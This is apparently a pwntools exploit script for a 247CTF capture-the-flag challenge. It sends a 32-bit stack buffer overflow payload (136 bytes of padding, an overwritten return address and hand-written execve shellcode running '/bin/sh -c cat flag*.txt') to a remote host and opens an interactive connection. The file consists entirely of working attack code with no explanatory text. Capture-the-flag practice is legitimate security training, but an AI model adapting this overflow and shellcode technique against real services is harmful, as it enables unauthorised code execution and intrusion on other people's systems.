from pwn import *

# Set context for 32-bit binary
context.update(arch='i386', os='linux')

# Target info
HOST = '756b828988cc7d84.247ctf.com'
PORT = 50220

# Exploit settings
offset = 136  # Bytes to overflow buffer
ret_address = p32(0x080484a6)  # Overwrite return address (JMP to shellcode)

# Jump stub (JMP +0x20), 4 NOPs for alignment
jmp_stub = b"\x00\x90\x90\xEB\x20"

# Stack data (will be referenced in shellcode)
data = b"/bin/sh\x00"          # +0
data += b"sh\x00"              # +8
data += b"-c\x00"              # +11
data += b"cat flag*.txt\x00"   # +14

# Shellcode that performs execve("/bin/sh", ["sh", "-c", "cat flag*.txt"], 0)
shellcode = asm('''
    nop
    nop
    nop
    nop
    lea esi, [esp+4]        /* point to start of /bin/sh data */
    lea esp, [esp-136]      /* move stack safely away */
    mov eax, 0xb            /* syscall: execve */
    lea ebx, [esi]          /* ebx = "/bin/sh" */
    push 0x0                /* NULL terminator */
    lea ecx, [esi+14]       /* ecx = "cat flag*.txt" */
    push ecx
    lea ecx, [esi+11]       /* ecx = "-c" */
    push ecx
    lea ecx, [esi+8]        /* ecx = "sh" */
    push ecx
    lea ecx, [esp]          /* ecx = argv pointer */
    mov edx, 0x0            /* envp = NULL */
    int 0x80                /* syscall execve() */
    mov eax, 1              /* syscall: exit */
    mov ebx, 0x69           /* status 105 */
    int 0x80
''')

# Construct the full payload
payload = b"A" * offset         # buffer padding
payload += jmp_stub            # EIP will land after 0x20 bytes
payload += ret_address         # overwritten return address
payload += data                # our string data block
payload += b"\x90" * 4         # NOPs before shellcode
payload += shellcode           # actual shellcode

# Send the payload to the target
conn = remote(HOST, PORT)
log.info("Sending payload...")
conn.sendline(payload)
conn.interactive()
